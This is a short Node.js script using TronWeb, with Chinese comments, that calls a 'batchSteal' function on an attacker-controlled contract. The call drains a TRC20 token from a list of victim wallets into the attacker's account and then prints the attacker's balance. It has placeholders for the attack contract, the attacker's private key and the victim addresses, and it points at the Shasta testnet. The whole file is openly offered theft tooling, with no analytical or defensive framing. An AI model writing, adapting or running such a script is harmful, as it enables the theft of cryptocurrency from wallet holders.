// batchStealTRC20.js
const TronWeb = require("tronweb");

// ========== 配置 ==========
const ATTACK_CONTRACT = "你的攻击合约地址";
const TOKEN_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
const ATTACKER_PRIVATE_KEY = "你的攻击者钱包私钥";  // 从TronLink导出

const fullNode = "https://api.shasta.trongrid.io";
const solidityNode = "https://api.shasta.trongrid.io";
const eventServer = "https://api.shasta.trongrid.io";

// 受害者地址列表（手动添加，或从你的后端数据库获取）
const victims = [
    "受害者钱包地址1",
    "受害者钱包地址2"
];

// ========== 主逻辑 ==========
const tronWeb = new TronWeb(fullNode, solidityNode, eventServer, ATTACKER_PRIVATE_KEY);
const attackABI = [
    {
        "inputs": [
            {"name": "token", "type": "address"},
            {"name": "victims", "type": "address[]"}
        ],
        "name": "batchSteal",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];
const attackContract = await tronWeb.contract(attackABI, ATTACK_CONTRACT);

async function stealAll() {
    console.log(`开始批量盗取，共 ${victims.length} 个地址`);
    const result = await attackContract.batchSteal(TOKEN_ADDRESS, victims).send();
    console.log("盗取交易hash:", result);
    
    // 查询攻击者余额
    const tokenContract = await tronWeb.contract().at(TOKEN_ADDRESS);
    const balance = await tokenContract.balanceOf(tronWeb.defaultAddress.base58).call();
    console.log("攻击者当前余额:", balance.toString());
}

stealAll().catch(console.error);
